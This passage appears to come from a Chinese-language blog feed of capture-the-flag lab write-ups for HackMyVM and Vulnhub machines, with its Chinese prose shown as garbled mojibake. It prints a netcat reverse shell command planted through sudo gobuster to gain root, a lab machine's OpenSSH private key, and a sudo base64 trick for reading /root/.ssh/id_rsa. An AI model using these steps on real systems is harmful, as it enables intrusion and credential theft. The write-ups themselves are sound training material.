HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /a HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ touch a.txt     </span><br><span class="line">welcome@listen:/tmp$ echo <span class="string">&quot;a&quot;</span> &gt; a.txt </span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">/a</span><br></pre></td></tr></table></figure></div>
<p>å› ä¸ºgobusteræ‰¾åˆ°å­—å…¸ä¸­å¯ä»¥è®¿é—®çš„ç›®å½•å°±ä¼šæ˜¾ç¤º <code>-q -n</code>æ˜¯ä¸ºäº†ä¸è¾“å‡ºbannerå’ŒçŠ¶æ€ç <br>è¿™æ ·å­—æˆ‘ä»¬å°±å¯ä»¥å†™åå¼¹shelläº† ç”¨-oå°†ç»“æœè¾“å‡ºåˆ°&#x2F;opt&#x2F;.test.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~]</span><br><span class="line">â””â”€<span class="comment"># touch b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e /bin/bash 192.168.240.83 1234 &quot;</span> &gt; b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">777</span> b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;tmp/b&quot;</span> &gt; b.txt</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo gobuster -u <span class="number">192.168</span>.<span class="number">240.83</span> -w b.txt -q -n -o â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="symbol">bash:</span> syntax error near unexpected token `(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">2025/02/05 05:42:21 [!] unable to connect to http://192.168.240.83/: Get http://192.168.240.83/: dial tcp 192.168.240.83:80: connect: connection refused</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br></pre></td></tr></table></figure></div>
<p>ç”¨æˆ‘è¿™ç§æ–¹å¼æ‰«ç›®å½•ï¼Œè¦åœ¨æœ¬æœºä¸»ç›®å½•ä¸‹å¼€httpï¼Œä¸ç„¶æ²¡æœ‰tmpç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~]</span><br><span class="line">â””â”€# nc -lp 1234              </span><br><span class="line">id</span><br><span class="line">  </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure></div>

<p>æ€»ç»“ï¼š1 wordpressçš„æ’ä»¶æ‰«æä»¥åŠå¸¸è§çš„åˆ©ç”¨ 2 gobusteræˆ–è€…ç›®å½•æ‰«æå·¥å…·çš„è¯»å–æ•æ„Ÿæ–‡ä»¶é€šç”¨æ€è·¯</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Baseme</title>
    <url>/posts/46022.html</url>
    <content><![CDATA[<p>HMV-Basemeé¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f9d0e0a243d4f878d0.png"></p>
<h1 id="Baseme"><a href="#Baseme" class="headerlink" title="Baseme"></a>Baseme</h1><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p><img src="https://pic1.imgdb.cn/item/679a3980d0e0a243d4f87970.png" alt="|500"><br>å¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£</p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p>webç»™äº†ä¸€è¡Œbase64åŠ å¯†è¿‡çš„æ–‡æœ¬  å¾—åˆ°ä¸€ä¸ªç”¨æˆ·å lucas<br><img src="https://pic1.imgdb.cn/item/679a3983d0e0a243d4f87971.png" alt="|425"><br>æç¤ºè¿™ä¸ªé¶æœºå…¨éƒ¨ç”¨çš„æ˜¯base64<br><img src="https://pic1.imgdb.cn/item/679a3985d0e0a243d4f87972.png" alt="|350"><br>è¿˜ç»™äº†ä¸€äº›å¯†ç å­—å…¸  æˆ‘ä»¬å­˜å‚¨å¹¶ä¸”è¿›è¡Œbase64</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/base]</span><br><span class="line">â””â”€# <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cat</span> pass);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> | <span class="built_in">base64</span> &gt;&gt; pass.txt;<span class="keyword">done</span>Â </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/base]</span><br><span class="line">â””â”€# <span class="built_in">cat</span> pass.txtÂ  Â  Â </span><br><span class="line">aWxvdmV5b3UK</span><br><span class="line">eW91bG92ZXlvdQo=</span><br><span class="line">c2hlbG92ZXN5b3UK</span><br><span class="line">aGVsb3Zlc3lvdQo=</span><br><span class="line">d2Vsb3ZleW91Cg==</span><br><span class="line">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå†è¿›è¡Œç›®å½•çˆ†ç ´<br>ç”¨gobuster midiumå­—å…¸çˆ†ç ´ä¹‹åè¿˜æ˜¯æ²¡æœ‰å‘ç°æœ‰ç”¨çš„ç›®å½•   æ¢dirb&#x2F;common.txtå­—å…¸<br>è¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯  è¿™é‡Œçš„å­—å…¸è¦å†ç”¨base64è¿›è¡Œç¼–ç ç„¶åçˆ†ç ´  æ‰¾åˆ°äº†ä¸¤ä¸ªç›®å½•<br><img src="https://pic1.imgdb.cn/item/679a3989d0e0a243d4f87974.png"><br>curlè®¿é—®å¾—åˆ°ä¸€ä¸²base64ç¼–ç   è§£å¯†ä¹‹åå¾—åˆ°æ˜¯rsaå¯†é’¥ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line"><span class="number">07</span>jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL<span class="symbol">/ptLk26RBnh</span></span><br><span class="line"><span class="number">7</span>bHG1JjGlxOkO6m<span class="operator">+</span><span class="number">1</span>oFNLtNuD2QPl8sbZtEzX4S9nNZ<span class="symbol">/dpyRpMfmB73rN3yyIylevVDEyv</span></span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq<span class="operator">+</span>b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj<span class="symbol">/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span></span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM<span class="operator">+</span><span class="number">3</span>mzWjPdoBK<span class="symbol">/Ho339uPmBWI5sbMrpK</span></span><br><span class="line">xkZMnl<span class="operator">+</span>rcTbgz4swv8gNuKhUc7wTgtrNX<span class="operator">+</span>PNMdIALNpsxYLt<span class="symbol">/l56GK8R4J8fLIU5+MojRs</span></span><br><span class="line"><span class="operator">+</span><span class="number">1</span>NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp<span class="operator">+</span>YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4<span class="operator">+</span>dW7nZ</span><br><span class="line">zjf3p0M77b<span class="symbol">/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span></span><br><span class="line">IJh<span class="operator">+</span>I<span class="operator">+</span>Zv1egSMS<span class="symbol">/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span></span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5<span class="symbol">/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span></span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS<span class="operator">+</span><span class="symbol">/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span></span><br><span class="line"><span class="operator">+</span><span class="number">8</span>gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ<span class="symbol">/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span></span><br><span class="line">tSn7hr8hppT2tUSxDvC<span class="operator">+</span>USMmw<span class="symbol">/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span></span><br><span class="line">N7bw45FhBZCsHCAbV2<span class="operator">+</span>hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif<span class="symbol">/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span></span><br><span class="line">O<span class="operator">+</span>TowA10RATek6ZEIxh6SmtDG<span class="symbol">/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span></span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line"><span class="number">3</span><span class="symbol">/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span></span><br><span class="line">ND8ikgmQvF6hrwwJBrp<span class="symbol">/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span></span><br><span class="line">LdmmRXUS<span class="operator">/</span>DtO<span class="operator">+</span><span class="number">69</span><span class="operator">/</span>aidvxGAYob<span class="operator">+</span><span class="number">1</span>M<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<p>å°è¯•ä½¿ç”¨sshç™»å½•<br><img src="https://pic1.imgdb.cn/item/679a3988d0e0a243d4f87973.png"><br>å‘ç°ä¸èƒ½ç›´æ¥ç™»å½• æ ¹æ®æç¤ºæ‰§è¡Œ <code>Â ssh-keygen -f &#39;/root/.ssh/known_hosts&#39; -R &#39;192.168.240.45&#39;</code><br>ç„¶åéœ€è¦å¯†ç   ç”¨ä¸€å¼€å§‹å¾—åˆ°çš„å‡ ä¸ªå¯†ç çš„base64ç¼–ç è¿›è¡Œå°è¯•  å‘ç°ç”¨ç¬¬ä¸€ä¸ªå°±èƒ½ç™»å½•<br><img src="https://pic1.imgdb.cn/item/679a3c2cd0e0a243d4f879d4.png"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>æŸ¥æ‰¾æœ‰æ²¡æœ‰suidææƒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">lucas<span class="variable">@baseme</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
<p>æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„  åœ¨æŸ¥çœ‹ç”¨æˆ·æœ‰æ²¡æœ‰sudoæƒé™<br><img src="https://pic1.imgdb.cn/item/679a3c2bd0e0a243d4f879d3.png"><br>å‘ç°å¯ä»¥æ‰§è¡Œbase64<br>ææƒæ–¹å¼ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">base64</span> <span class="string">&quot;<span class="variable">$LFILE</span>&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure></div>
<p>é€šè¿‡è¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥ç”¨rootæƒé™æŸ¥æƒ³è¦çš„æ–‡ä»¶  ä¹Ÿå¯ä»¥ç›´æ¥æŸ¥rootçš„sshçš„rsaå¯†é’¥  &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-deathnote</title>
    <url>/posts/34304.html</url>
    <content><![CDATA[<p>Vulnhub-deathnoteé¶æœºå¤ç›˜ï¼Œæˆ‘æœ€å–œæ¬¢åŠ¨æ¼«ä¸»é¢˜çš„é¶æœºhhh</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.40  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">11</span> <span class="number">10</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.40</span> (<span class="number">192.168</span>.<span class="number">179.40</span>)</span><br><span class="line">Host is up (<span class="number">0.0028</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">5</span>e:b8:ff:<span class="number">2</span>d:ac:c7:e9:<span class="number">3</span>c:<span class="number">99</span>:<span class="number">2</span>f:<span class="number">3</span>b:fc:da:<span class="number">5</span>c:a3:<span class="number">53</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> a8:f3:<span class="number">81</span>:<span class="number">9</span>d:<span class="number">0</span>a:dc:<span class="number">16</span>:<span class="number">9</span>a:<span class="number">49</span>:ee:bc:<span class="number">24</span>:e4:<span class="number">65</span>:<span class="number">5</span>c:a6 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">4</span>f:<span class="number">20</span>:c3:<span class="number">2</span>d:<span class="number">19</span>:<span class="number">75</span>:<span class="number">5</span>b:e8:<span class="number">1</span>f:<span class="number">32</span>:<span class="number">01</span>:<span class="number">75</span>:c2:<span class="number">70</span>:<span class="number">9</span>a:<span class="number">7</span>e (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">1</span>A:<span class="number">04</span>:<span class="number">7</span>A:CB:<span class="number">01</span>:C4 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.76</span> ms <span class="number">192.168</span>.<span class="number">179.40</span> (<span class="number">192.168</span>.<span class="number">179.40</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br></pre></td></tr></table></figure></div>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>ç›´æ¥è®¿é—®80ç«¯å£çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.40                           </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1; url=&#x27;http://deathnote.vuln/wordpress&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">cente</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please wait.....<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è€Œä¸”å‡ºç°äº†wordpress å…ˆç”¨ç›®å½•æ‰«ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># gobuster dir -u 192.168.179.40 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x html,php,jpg,wbpg</span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.179.40</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">10</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              html,php,jpg,wbpg</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/index.html</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">197</span>]</span><br><span class="line"><span class="symbol">/.htaccess</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/robots.txt</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">68</span>]</span><br><span class="line"><span class="symbol">/.</span>                    (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">197</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.html</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.php</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.jpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.html.wbpg</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.php</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span 